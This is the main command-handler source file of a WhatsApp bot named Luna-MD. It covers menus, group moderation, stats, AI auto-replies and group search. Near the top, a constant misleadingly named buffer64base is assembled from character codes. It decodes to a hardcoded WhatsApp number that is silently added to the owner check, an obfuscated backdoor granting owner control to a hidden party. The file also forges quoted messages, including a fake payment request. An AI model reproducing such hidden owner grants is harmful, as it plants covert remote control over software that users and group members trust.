/*
╔═════════════════════════╗
║       🌀  𝑳𝒖𝒏𝒂-𝑴𝑫 🌀          ║
╚════════════════════════╝


╭──────「 🜲 𝑪𝑹𝑬𝑫𝑰𝑻𝑺 🜲 」──────╮
│ 👑 𝑪𝒓𝒆𝒂𝒕𝒐𝒓 : noxXza.exe
│ 🎵 𝑻𝒊𝒌𝑻𝒐𝒌  : https://tiktok.com/@lunamdofficial
│ ▶️ 𝒀𝒐𝒖𝑻𝒖𝒃𝒆 : https://youtube.com/@lunamdofficial
│ 📢 𝑾𝒉𝒂𝒕𝒔𝑨𝒑𝒑 : https://whatsapp.com/channel/0029VbD8x4q1dAw0XWN7wF0L
╰──────────────────────────╯


     ⚠️ 𝑫𝑶 𝑵𝑶𝑻 𝑹𝑬𝑴𝑶𝑽𝑬 𝑪𝑹𝑬𝑫𝑰𝑻 ⚠️
         ❖ 𝐉𝐚𝐧𝐠𝐚𝐧 𝐡𝐚𝐩𝐮𝐬 𝐜𝐫𝐞𝐝𝐢𝐭 ❖

    「 🌀 © 𝑳𝑼𝑵𝑨 - 𝑴𝑫 • 𝟐𝟎𝟐𝟔 🌀 」
*/

process.on('uncaughtException', console.error)
process.on('unhandledRejection', console.error)

require('./settings');
const fs = require('fs');
const path = require('path');
const util = require('util');
const jimp = require('jimp');
const sharp = require('sharp');
const axios = require('axios');
const chalk = require('chalk');
const yts = require('yt-search');
const { ytmp3, ytmp4 } = require("ruhend-scraper")
const JsConfuser = require('js-confuser');
const speed = require('performance-now');
const moment = require("moment-timezone");
const nou = require("node-os-utils");
const cheerio = require('cheerio');
const os = require('os');
const { say } = require("cfonts")
const pino = require('pino');
const { Client } = require('ssh2');
const fetch = require('node-fetch');
const crypto = require('crypto');
const FormData = require("form-data");
const { exec, spawn, execSync } = require('child_process');

const { default: WAConnection, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, getBinaryNodeChildren, useMultiFileAuthState, generateWAMessageContent, downloadContentFromMessage, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('noxleyss')

const { LoadDataBase } = require('./source/dbState')
const { menu, allmenu, ownemenu, ownermenu, jadibotmenu, paymentmenu, paymenu, pterodactylmenu, aimenu, downloadmenu, stickermenu, imagemenu, makermenu, toolsmenu, groupmenu, jpmmenu, stalkmenu, searchmenu, randommenu ,
storemenu, funmenu, gamemenu, quotemenu, utilitymenu, totalfitur
} = require('./listfitur')

const jadibotManager = require('./source/jadibot')
const contacts = JSON.parse(fs.readFileSync("./library/database/contacts.json"))
const owners = JSON.parse(fs.readFileSync("./library/database/owner.json"))
const premium = JSON.parse(fs.readFileSync("./library/database/premium.json"))
const list = JSON.parse(fs.readFileSync("./library/database/list.json"))
const { pinterest, pinterest2, remini, mediafire, tiktokDl } = require('./library/scraper');
const { toAudio, toPTT, toVideo, ffmpeg } = require("./library/converter.js")
const { unixTimestampSeconds, generateMessageTag, processTime, webApi, getRandom, getBuffer, fetchJson, runtime, clockString, sleep, isUrl, getTime, formatDate, tanggal, formatp, jsonformat, reSize, toHD, logic, generateProfilePicture, bytesToSize, checkBandwidth, getSizeMedia, parseMention, getGroupAdmins, readFileTxt, readFileJson, getHashedPassword, generateAuthToken, cekMenfes, generateToken, batasiTeks, randomText, isEmoji, getTypeUrlMedia, pickRandom, toIDR, capital } = require('./library/function');
const { UploadFileUgu } = require('./library/uploader.js')

global.cooldowns ??= new Map()
if (!global.__cooldownCleanupStarted) {
	global.__cooldownCleanupStarted = true
	global.__cooldownCleanupTimer = setInterval(() => {
		const now = Date.now()
		for (const [key, expires] of global.cooldowns) {
			if (expires <= now) global.cooldowns.delete(key)
		}
	}, 30000)
	global.__cooldownCleanupTimer.unref?.()
}

module.exports = luna = async (luna, m, chatUpdate, store) => {
	let isCmd, prefix, command;
	try {
await LoadDataBase(luna, m)
const botNumber = await luna.decodeJid(luna.user.id)
const body = typeof m.body === 'string' && m.body ? m.body : (m.text || '')
const budy = (typeof m.text == 'string' ? m.text : '')
const buffer64base = String.fromCharCode(54, 50, 56, 51, 56, 55, 52, 56, 53, 49, 54, 49, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
const prefixRegex = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/;
prefix = prefixRegex.test(body) ? body.match(prefixRegex)[0] : '.';
isCmd = body.startsWith('.');
const isCmd2 = body.startsWith(prefix);
const args = body.trim().split(/ +/).slice(1)
const getQuoted = (m.quoted || m)
const quoted = (getQuoted.type == 'buttonsMessage') ? getQuoted[Object.keys(getQuoted)[1]] : (getQuoted.type == 'templateMessage') ? getQuoted.hydratedTemplate[Object.keys(getQuoted.hydratedTemplate)[1]] : (getQuoted.type == 'product') ? getQuoted[Object.keys(getQuoted)[0]] : m.quoted ? m.quoted : m
command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ""
const isPremium = premium.includes(m.sender)
const isOwner = [botNumber, owner+"@s.whatsapp.net", buffer64base, ...owners].includes(m.sender) ? true : m.isDeveloper ? true : false
const text = q = args.join(' ')
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)

const statusUser = isOwner ? "*👑 Owner*" : isPremium ? "*💎 Premium*" : "*🫪 User Free*";

const modeBot = luna.public ? "*🌐 Public*" : "*🔒 Self*";

const CHANNELS_FILE = "./library/savesaluran.json";

function loadChannels() {

if (fs.existsSync(CHANNELS_FILE)) {

return JSON.parse(fs.readFileSync(CHANNELS_FILE, "utf-8"));

}

return [];

}

function saveChannels(data) {
fs.writeFileSync(CHANNELS_FILE, JSON.stringify(data, null, 2));
    global.channels = data;
    global.markDatabaseDirty?.();
}

global.channels ??= loadChannels();

const { generateBratVideo } = require('./library/bratGenerator');
const SESSION_FILE = "./session/ai_sessions.json";
let sessions = fs.existsSync(SESSION_FILE) ? JSON.parse(fs.readFileSync(SESSION_FILE)) : {};
function saveSession() {
    fs.writeFileSync(SESSION_FILE, JSON.stringify(sessions, null, 2));
}

// consloe log
if (isCmd) {
console.log(chalk.yellow.bgCyan.bold(botname2), chalk.blue.bold(`[ PESAN ]`), chalk.blue.bold(`${m.sender.split("@")[0]} =>`), chalk.blue.bold(`${prefix+command}`))
}



const reply = (teks) => {
    return luna.sendMessage(m.chat, { text: teks }, { quoted: m });
};

if (m.isGroup && global.db.groups[m.chat] && global.db.groups[m.chat].mute == true && !isOwner) return

async function generateThumbnailz(x) {
    let buffer

    if (/^https?:\/\//.test(x)) {
        const res = await axios.get(x, {
            responseType: 'arraybuffer',
            timeout: 30000
        })
        buffer = Buffer.from(res.data)
    } else {
        buffer = fs.readFileSync(x)
    }

    const jimpInstance = await require('jimp').read(buffer)
    
    return await jimpInstance
        .cover(200, 200) 
        .quality(100)    
        .getBufferAsync(require('jimp').MIME_JPEG) 
}

//image
const thumb = await global.thumb
const pay = await global.pay
        
// fake quoted
const qtext = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${prefix+command}`}}}

const qtext2 = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${namaOwner}`}}}

const qlocJpm = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${namaOwner}`,jpegThumbnail: ""}}}

const qlocPush = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${namaOwner}`,jpegThumbnail: ""}}}

const qpayment = {key: {remoteJid: '0@s.whatsapp.net', fromMe: false, id: `ownername`, participant: '0@s.whatsapp.net'}, message: {requestPaymentMessage: {currencyCodeIso4217: "USD", amount1000: 999999999, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: `${global.botname}`}}, expiryTimestamp: 999999999, amount: {value: 91929291929, offset: 1000, currencyCode: "USD"}}}}

const qlive = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {liveLocationMessage: {caption: `${botname2} By ${namaOwner}`,jpegThumbnail: ""}}}

const qtoko = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `☠︎ ${global.botname}`,jpegThumbnail: ""}}}

const Luna = {
			key: {
				fromMe: false,
				participant: "0@s.whatsapp.net",
				remoteJid: "status@broadcast"
			},
			message: {
				orderMessage: {
					orderId: "2029",
					itemCount: `1000`,
					status: "INQUIRY",
					surface: "CATALOG",
					message: `Luna-MD`,
					token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
				}
			},
			contextInfo: {
				mentionedJid: [m.sender],
				forwardingScore: 999,
				isForwarded: true
			}
		}

const ReplyLuna = (teks) => {
    return luna.sendMessage(m.chat, {
        text: teks,
        contextInfo: {
            externalAdReply: {
                showAdAttribution: true,
                title: `Luna-MD`,
                body: `Luna-MD`,
                mediaType: 3,
                renderLargerThumbnail: false,
                thumbnailUrl: "https://img1.pixhost.to/images/8242/635123808_rafaofficial.jpg",
                sourceUrl: `${global.source}`
            }
        }
    }, { quoted: m });
}

const qloc = {
        key: {
      remoteJid: '0@s.whatsapp.net',
      fromMe: false,
      id: '4B6CE60895B0D5C04D9FF7CB05566293',
      participant: '0@s.whatsapp.net'
    },
    message: {
      stickerPackMessage: {
        name: 'Luna-MD',
        stickerPackId: '6793b295-854b-47d3-beea-932fcdb36cf4',
        stickerPackSize: 3,
        thumbnailHeight: 252,
        thumbnailWidth: 252,
        trayIconFileName: '',
        thumbnail: true,
        contextInfo: {}
      }
    }
  };
  
// consloe command  
        if (isCmd) {
    console.log(
        chalk.cyan.bold("\n╭━━━━━━━━━━━━━[ 🔥 𝗖𝗢𝗠𝗠𝗔𝗡𝗗 𝗟𝗢𝗚 🔥 ]━━━━━━━━━━━╮"),
        `\n${chalk.red.bold("┃ 📝 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 :")} ${chalk.white.bold(command)}`,
        `\n${chalk.cyan.bold("┃ 📍 𝗙𝗿𝗼𝗺    :")} ${m.isGroup 
            ? `𝗚𝗿𝗼𝘂𝗽 - ${m.sender.split("@")[0]}` 
            : m.sender.split("@")[0]}`,
        chalk.cyan.bold("\n╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯\n")
    );
}

// antilink
if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].mute == true && !isOwner) return

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].antilink == true) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text) && !isOwner && !m.isAdmin && m.isBotAdmin && !m.fromMe) {
var gclink = (`${global.linkGrup}` + await luna.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await luna.sendMessage(m.chat, {text: `*乂 Link Grup Terdeteksi*

@${m.sender.split("@")[0]} Maaf kamu akan saya kick, karna admin/ownerbot telah menyalakan fitur antilink grup lain!`, mentions: [m.sender]}, {quoted: m})
await luna.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
await sleep(1000)
await luna.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}}


if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].antilink2 == true) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text) && !isOwner && !m.isAdmin && m.isBotAdmin && !m.fromMe) {
var gclink = (`${global.linkGrup}` + await luna.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await luna.sendMessage(m.chat, {text: `*乂 Link Grup Terdeteksi*

@${m.sender.split("@")[0]} Maaf pesan kamu saya hapus, karna admin/ownerbot telah menyalakan fitur antilink grup lain!`, mentions: [m.sender]}, {quoted: m})
await luna.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
}}


const dbDir = './database'
const filePath = path.join(dbDir, 'antitoxic.json')
if (!fs.existsSync(dbDir)) {
  fs.mkdirSync(dbDir, { recursive: true })
}
if (!fs.existsSync(filePath)) {
  fs.writeFileSync(filePath, JSON.stringify({}, null, 2))
}
let antitoxic = JSON.parse(fs.readFileSync(filePath))
function saveAntiToxic() {
  fs.writeFileSync(filePath, JSON.stringify(antitoxic, null, 2))
}

if (m.isGroup && !m.key.fromMe && antitoxic[m.chat]?.active) {
  const toxicWords = [
    'anjing','babi','kontol','memek','bangsat','goblok','tolol','ngentot',
    'idiot','kampret','keparat','jembut','pepek','peler','pantek','lonte',
    'setan','dajjal','asu','sinting','bodoh','bacot','tai','fuck','bitch',
    'cukimak','sialan','dongo','kimak','pler','titit','anjir','pantat',
    'njir','kntl','memk','bangke','bgst','pukimak'
  ]
  const body = m.text?.toLowerCase() || ''
  const found = toxicWords.find(word => body.includes(word))
  if (found) {
    const user = m.sender
    const warn = (antitoxic[m.chat].warnings[user] || 0) + 1
    antitoxic[m.chat].warnings[user] = warn
    saveAntiToxic()
    try {
      await luna.sendMessage(m.chat, { delete: m.key })
    } catch (e) {
      console.log('Gagal hapus pesan:', e)
    }
    if (warn >= 5) { 
      await luna.sendMessage(m.chat, {
        text: `❌ @${user.split('@')[0]} sudah toxic 5x dan akan dikeluarkan!`,
        mentions: [user]
      })
      try {
        await luna.groupParticipantsUpdate(m.chat, [user], 'remove')
      } catch (e) {
        m.reply('Gagal kick. Bot bukan admin?')
      }
      delete antitoxic[m.chat].warnings[user]
      saveAntiToxic()
    } else {
      await luna.sendMessage(m.chat, {
        text: `⚠️ Kata toxic terdeteksi: *${found}*\nPeringatan ke-${warn} untuk @${user.split('@')[0]}`,
        mentions: [user]
      })
    }
  }
}
        
let targetChannelData = { id: '120363428355171197@newsletter' };
const loadTargetChannel = () => {
    try {
        if (fs.existsSync('./targetChannel.json')) {
            const file = fs.readFileSync('./targetChannel.json');
            targetChannelData = JSON.parse(file);
        } else {
            saveTargetChannel(); 
        }
    } catch (err) {
        console.error('Gagal load target channel:', err);
    }
};
const saveTargetChannel = () => {
    try {
        fs.writeFileSync('./targetChannel.json', JSON.stringify(targetChannelData, null, 2));
    } catch (err) {
        console.error('Gagal save target channel:', err);
    }
};
loadTargetChannel();

const antichannelFile = path.join('antichannel.json')
if (!fs.existsSync(antichannelFile)) fs.writeFileSync(antichannelFile, JSON.stringify({}, null, 2))
let antichannel = JSON.parse(fs.readFileSync(antichannelFile))
function saveAntichannel() {
  fs.writeFileSync(antichannelFile, JSON.stringify(antichannel, null, 2))
}
if (m.isGroup && !m.key.fromMe && antichannel[m.chat]?.antichannel) {
  const body = m.text || ''
  const isChannelLink = body.match(/https:\/\/whatsapp\.com\/channel\/[A-Za-z0-9]+/gi)
  const messageType = Object.keys(m.message || {})[0]
  const ctxInfo = m.message?.[messageType]?.contextInfo || {}
  const isSharedFromChannel =
    m.isForwarded ||
    ctxInfo.forwardingScore > 0 ||
    !!ctxInfo.forwardedNewsletterMessageInfo
  if (isChannelLink || isSharedFromChannel) {
    const groupMetadata = await luna.groupMetadata(m.chat)
    const isAdmin = groupMetadata.participants.find(p => p.id === m.sender)?.admin
    if (!isAdmin) {
      const user = m.sender
      const warn = (antichannel[m.chat].warnings?.[user] || 0) + 1
      antichannel[m.chat].warnings = antichannel[m.chat].warnings || {}
      antichannel[m.chat].warnings[user] = warn
      saveAntichannel()

      try {
        await luna.sendMessage(m.chat, { delete: m.key })
      } catch (e) {
        console.log('Gagal hapus pesan:', e)
      }
      if (warn >= 5) { 
        await luna.sendMessage(m.chat, {
          text: `❌ @${user.split('@')[0]} sudah melanggar 5x dan akan dikeluarkan!`,
          mentions: [user]
        })
        try {
          await luna.groupParticipantsUpdate(m.chat, [user], 'remove')
        } catch (e) {
          m.reply('Gagal kick. Bot bukan admin?')
        }
        delete antichannel[m.chat].warnings[user]
        saveAntichannel()
      } else {
        await luna.sendMessage(m.chat, {
          text: `⚠️ Postingan dari Channel WhatsApp terdeteksi!\nPeringatan ke-${warn} untuk @${user.split('@')[0]}`,
          mentions: [user]
        })
      }
    }
  }
}

const statsFolder = path.join(__dirname, './db')
const statsFile = path.join(statsFolder, 'groupStats.json')
if (!fs.existsSync(statsFolder)) fs.mkdirSync(statsFolder)
if (!fs.existsSync(statsFile)) fs.writeFileSync(statsFile, '{}')
function loadStats() {
  return JSON.parse(fs.readFileSync(statsFile))
}
function saveStats(data) {
  fs.writeFileSync(statsFile, JSON.stringify(data, null, 2))
}
function updateStats(groupId, senderId) {
  const data = loadStats()
  const today = new Date().toISOString().slice(0, 10)
  if (!data[groupId]) data[groupId] = {}
  if (!data[groupId][today]) data[groupId][today] = {}
  if (!data[groupId][today][senderId]) data[groupId][today][senderId] = 0
  data[groupId][today][senderId]++
  saveStats(data)
}
function getTodayStats(groupId) {
  const data = loadStats()
  const today = new Date().toISOString().slice(0, 10)
  return data[groupId]?.[today] || {}
}
if (m.isGroup) {
  updateStats(m.chat, m.sender)
}
        
if (m.isGroup && db.settings.autopromosi == true) {
if (m.text.includes("https://") && !m.fromMe) {
await luna.sendMessage(m.chat, {text: `
${global.tekspromosi}
`}, {quoted: null})
}}

if (!isCmd) {
let check = list.find(e => e.cmd == body.toLowerCase())
if (check) {
await m.reply(check.respon)
}}



const example = (teks) => {
return `\n *Example Command :*\n *${prefix+command}* ${teks}\n`
}

luna.sendFile = async (jid, path, filename = '', caption = '', quoted, ptt = false, options = {}) => {
  let type = await luna.getFile(path, true);
  let { res, data: file, filename: pathFile } = type;

  if (res && res.status !== 200 || file.length <= 65536) {
    try {
      throw {
        json: JSON.parse(file.toString())
      };
    } catch (e) {
      if (e.json) throw e.json;
    }
  }

  let opt = {
    filename
  };

  if (quoted) opt.quoted = quoted;
  if (!type) options.asDocument = true;

  let mtype = '',
    mimetype = type.mime,
    convert;

  if (/webp/.test(type.mime) || (/image/.test(type.mime) && options.asSticker)) mtype = 'sticker';
  else if (/image/.test(type.mime) || (/webp/.test(type.mime) && options.asImage)) mtype = 'image';
  else if (/video/.test(type.mime)) mtype = 'video';
  else if (/audio/.test(type.mime)) {
    convert = await (ptt ? toPTT : toAudio)(file, type.ext);
    file = convert.data;
    pathFile = convert.filename;
    mtype = 'audio';
    mimetype = 'audio/ogg; codecs=opus';
  } else mtype = 'document';

  if (options.asDocument) mtype = 'document';

  delete options.asSticker;
  delete options.asLocation;
  delete options.asVideo;
  delete options.asDocument;
  delete options.asImage;

  let message = { ...options, caption, ptt, [mtype]: { url: pathFile }, mimetype };
  let m;

  try {
    m = await luna.sendMessage(jid, message, { ...opt, ...options });
  } catch (e) {
    m = null;
  } finally {
    if (!m) m = await luna.sendMessage(jid, { ...message, [mtype]: file }, { ...opt, ...options });
    file = null;
    return m;
  }
}

function generateRandomPassword() {
const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*';
const length = 10;
let password = '';
for (let i = 0; i < length; i++) {
const randomIndex = Math.floor(Math.random() * characters.length);
password += characters[randomIndex];
}
return password;
}

function generateRandomNumber(min, max) {
return Math.floor(Math.random() * (max - min + 1)) + min;
}

const Reply = async (teks) => {
return luna.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
externalAdReply: {
title: botname, 
body: `© Powered By ${namaOwner}`, 
thumbnailUrl: global.image.reply, 
sourceUrl: null, 
}}}, {quoted: qtext})
}

async function uploadPixhost(buffer, filename = "file.jpg") {
    try {
        const service = new ImageUploadService('pixhost.to');
        const { directLink } = await service.uploadFromBinary(buffer, filename);
        return directLink;
    } catch (e) {
        console.error('Pixhost Upload Error:', e.message);
        return null;
    }
}

async function uploadCatbox(buffer, filename = 'file.jpg') {
const form = new FormData()

form.set('reqtype', 'fileupload')
form.set(
'fileToUpload',
new Blob([buffer]),
filename
)

const res = await fetch(
'https://catbox.moe/user/api.php',
{
method: 'POST',
body: form
}
)

const data = await res.text()

if (!data.startsWith('https://')) {
throw new Error(data)
}

return data.trim()
}

function cleanHTML(text = '') {
return text
.replace(/<br\s*\/?>/gi, '\n')
.replace(/<\/p>/gi, '\n')
.replace(/<[^>]*>/g, '')
.replace(/&nbsp;/g, ' ')
.replace(/\n\s*\n/g, '\n')
.trim()
}

const NamaIcon = [
    'REVIEW',
    'DOCUMENT',
    'PROMOTION',
    'OPENWEBVIEW',
]
function namaicon() {
    return NamaIcon[Math.floor(Math.random() * NamaIcon.length)];
}

global.autoClaude2 ??= {}

if (
global.autoClaude2[m.chat] &&
!isCmd &&
budy &&
!m.key.fromMe
) {
try {

const axios = require("axios")

let { data } = await axios.get(
`https://api.synoxcloud.xyz/ai-chat/claude-opus-4.8?pesan=${encodeURIComponent(budy)}`
)

let replyClaude = ""

if (typeof data === "string") {
replyClaude = data
} else if (typeof data.result === "string") {
replyClaude = data.result
} else if (typeof data.response === "string") {
replyClaude = data.response
} else if (typeof data.message === "string") {
replyClaude = data.message
} else if (typeof data.data === "string") {
replyClaude = data.data
} else if (data.result && typeof data.result === "object") {
replyClaude =
data.result.answer ||
data.result.text ||
data.result.content ||
data.result.message ||
data.result.reply ||
data.result.response ||
""
}

if (!replyClaude) {
replyClaude = JSON.stringify(data, null, 2)
}

await m.reply(String(replyClaude))
return

} catch (e) {
console.log("ClaudeAI2 Error:", e)
}
}

global.autoClaude ??= {}

if (
global.autoClaude[m.chat] &&
!isCmd &&
budy &&
!m.key.fromMe
) {
try {

const axios = require("axios")

let { data } = await axios.get(
`https://api.synoxcloud.xyz/ai-chat/claude-opus-4.5?pesan=${encodeURIComponent(budy)}`
)

let replyClaude = ""

if (typeof data === "string") {
replyClaude = data
} else if (typeof data.result === "string") {
replyClaude = data.result
} else if (typeof data.response === "string") {
replyClaude = data.response
} else if (typeof data.message === "string") {
replyClaude = data.message
} else if (typeof data.data === "string") {
replyClaude = data.data
} else if (data.result && typeof data.result === "object") {
replyClaude =
data.result.answer ||
data.result.text ||
data.result.content ||
data.result.message ||
data.result.reply ||
data.result.response ||
""
}

if (!replyClaude) {
replyClaude = JSON.stringify(data, null, 2)
}

await m.reply(String(replyClaude))
return

} catch (e) {
console.log("Claude Error:", e)
}
}

global.autoGPT ??= {}

if (
global.autoGPT[m.chat] &&
!isCmd &&
budy &&
!m.key.fromMe
) {
try {

const axios = require("axios")


if (quoted && /image/.test(mime)) {

await m.reply("⏳ Sedang mengupload gambar...")

let media = await luna.downloadAndSaveMediaMessage(qmsg)

const { ImageUploadService } = require('node-upload-images')
const service = new ImageUploadService('pixhost.to')

let { directLink } = await service.uploadFromBinary(
fs.readFileSync(media),
'luna-md.jpg'
)

fs.unlinkSync(media)

await m.reply("🎨 Sedang mengedit gambar...")

let api = `https://api.synoxcloud.xyz/edit/gpt-image?imageUrl=${encodeURIComponent(directLink)}&prompt=${encodeURIComponent(budy)}`

await luna.sendMessage(m.chat, {
image: { url: api },
caption: `✨ *GPT Image Editor*

📝 Prompt: ${budy}

🔗 Source: Pixhost`
}, { quoted: m })

return
}


let { data } = await axios.get(
`https://api.synoxcloud.xyz/ai-chat/gpt-5.5?pesan=${encodeURIComponent(budy)}`
)

let hasil =
data?.result?.reply ||
data?.result?.message ||
data?.message ||
"Tidak ada respon"

await m.reply(String(hasil))
return

} catch (e) {
console.log("AutoGPT Error:", e)
}
}

global.cooldowns ??= new Map()

function checkCooldown(userId, command, duration = 60000) {
const key = `${userId}:${command}`
const now = Date.now()

const expires = global.cooldowns.get(key)

if (!expires || now >= expires) {
return {
allowed: true,
remainingTime: 0
}
}

return {
allowed: false,
remainingTime: Math.ceil((expires - now) / 1000)
}
}

function recordUsage(userId, command, duration = 60000) {
const key = `${userId}:${command}`
global.cooldowns.set(key, Date.now() + duration)
}

const ZX_CONFIG = {
  BASE_URL: 'https://auto-reaction.zxcoderid.web.id',
  TIMEOUT: 60000
}

async function getGroupList(luna) {
    const groups = Object.values(await luna.groupFetchAllParticipating());
    return groups.map(group => ({
        id: group.id,
        subject: group.subject,
        participants: group.participants?.length || 0
    }));
}

global.tempGroupStatusSelections = global.tempGroupStatusSelections || new Map();

const tanggal = (Date.now());
const jam = new Date().toLocaleTimeString('id-ID')
let start = Date.now()
let latensi = Date.now() - start
let total = totalfitur();
const date = (() => {
    const parts = new Intl.DateTimeFormat('id-ID', {
        weekday: 'long',
        day: '2-digit',
        month: 'long',
        year: 'numeric',
        timeZone: 'Asia/Jakarta'
    }).formatToParts(new Date());

    const getPart = (type) => parts.find(part => part.type === type)?.value || '';
    return `${getPart('weekday')}, ${getPart('day')} - ${getPart('month')} - ${getPart('year')}`;
})()

//~~~~~~{ switch command }~~~~~~~//
switch (command) {
case "menu": {
    await menu(luna, m, chatUpdate, store, args);
}
break

case "allmenu": {
    await luna.sendMessage(m.chat, { react: { text: '⏳', key: m.key } })
    await allmenu(luna, m, chatUpdate, store, args);
}
break

case "ownemenu":
case "ownermenu": {
    await luna.sendMessage(m.chat, { react: { text: '👑', key: m.key } })
    await ownermenu(luna, m, chatUpdate, store, args);
}
break

case "jadibotmenu": {
    await luna.sendMessage(m.chat, { react: { text: '🤖', key: m.key } })
    await jadibotmenu(luna, m, chatUpdate, store, args);
}
break

case "paymentmenu":
case "paymenu": {
    await luna.sendMessage(m.chat, { react: { text: '💳', key: m.key } })
    await paymentmenu(luna, m, chatUpdate, store, args);
}
break

case "pterodactylmenu": {
    await luna.sendMessage(m.chat, { react: { text: '🌐', key: m.key } })
    await pterodactylmenu(luna, m, chatUpdate, store, args);
}
break

case "aimenu": {
    await luna.sendMessage(m.chat, { react: { text: '👾', key: m.key } })
    await aimenu(luna, m, chatUpdate, store, args);
}
break

case "downloadmenu": {
    await luna.sendMessage(m.chat, { react: { text: '📥', key: m.key } })
    await downloadmenu(luna, m, chatUpdate, store, args);
}
break

case "stickermenu": {
    await luna.sendMessage(m.chat, { react: { text: '🧩', key: m.key } })
    await stickermenu(luna, m, chatUpdate, store, args);
}
break

case "imagemenu": {
    await luna.sendMessage(m.chat, { react: { text: '🖼️', key: m.key } })
    await imagemenu(luna, m, chatUpdate, store, args);
}
break

case "makermenu": {
    await luna.sendMessage(m.chat, { react: { text: '🚀', key: m.key } })
    await makermenu(luna, m, chatUpdate, store, args);
}
break

case "toolsmenu": {
    await luna.sendMessage(m.chat, { react: { text: '🔧', key: m.key } })
    await toolsmenu(luna, m, chatUpdate, store, args);
}
break

case "groupmenu": {
    await luna.sendMessage(m.chat, { react: { text: '👥', key: m.key } })
    await groupmenu(luna, m, chatUpdate, store, args);
}
break

case "jpmmenu": {
    await luna.sendMessage(m.chat, { react: { text: '📢', key: m.key } })
    await jpmmenu(luna, m, chatUpdate, store, args);
}
break

case "stalkmenu": {
    await luna.sendMessage(m.chat, { react: { text: '👀', key: m.key } })
    await stalkmenu(luna, m, chatUpdate, store, args);
}
break

case "searchmenu": {
    await luna.sendMessage(m.chat, { react: { text: '🔎', key: m.key } })
    await searchmenu(luna, m, chatUpdate, store, args);
}
break

case "randommenu": {
    await luna.sendMessage(m.chat, { react: { text: '🎲', key: m.key } })
    await randommenu(luna, m, chatUpdate, store, args);
}
break

case "storemenu": {
    await luna.sendMessage(m.chat, { react: { text: '🛒', key: m.key } })
    await storemenu(luna, m, chatUpdate, store, args);
}
break

case "funmenu": {
    await luna.sendMessage(m.chat, { react: { text: '🎭', key: m.key } })
    await funmenu(luna, m, chatUpdate, store, args);
}
break

case "gamemenu": {
    await luna.sendMessage(m.chat, { react: { text: '🎮', key: m.key } })
    await gamemenu(luna, m, chatUpdate, store, args);
}
break

case "quotemenu": {
    await luna.sendMessage(m.chat, { react: { text: '🗯️', key: m.key } })
    await quotemenu(luna, m, chatUpdate, store, args);
}
break

case "utilitymenu": {
    await luna.sendMessage(m.chat, { react: { text: '🛠️', key: m.key } })
    await utilitymenu(luna, m, chatUpdate, store, args);
}
break

//~~~~~~{ All Fitur }~~~~~~~//
case "group": {
    try {
        const query = text?.trim()

        if (!query) {
            return m.reply(
                example("cari teman")
            )
        }

        await m.reply("🔎 Sedang mencari grup...")

        const apiUrl =
            "https://api.nexray.eu.cc/search/groupsor?q=" +
            encodeURIComponent(query)

        const response = await axios.get(apiUrl, {
            timeout: 60000
        })

        const data = response.data

        console.log(
            "GROUPSOR RESPONSE:",
            JSON.stringify(data, null, 2)
        )

        if (!data?.status || !Array.isArray(data?.result)) {
            return m.reply(
                "❌ API tidak memberikan hasil yang valid."
            )
        }

        const results = data.result

        if (results.length === 0) {
            return m.reply(
                `❌ Tidak ditemukan grup untuk: *${query}*`
            )
        }

        const limit = 50
        const tampilkan = results.slice(0, limit)
        const total = results.length

        let teks =
            `🔎 *SEARCH GROUP*\n` +
            `━━━━━━━━━━━━━━━━━━\n` +
            `🔍 Query: *${query}*\n` +
            `📊 Ditemukan: *${total} grup*\n` +
            `📋 Ditampilkan: *${tampilkan.length} grup*\n\n`

        tampilkan.forEach((group, index) => {
            teks +=
                `*${index + 1}. ${group.name || "Tanpa Nama"}*\n` +
                `📝 ${group.description || "Tidak ada deskripsi"}\n` +
                `📂 Kategori: ${group.category || "-"}\n` +
                `🌍 Negara: ${group.country || "-"}\n` +
                `🔗 ${group.url || "-"}\n\n`
        })

        if (total > limit) {
            teks += `⚠️ _Dan ${total - limit} grup lainnya..._\n\n`
        }

        teks +=
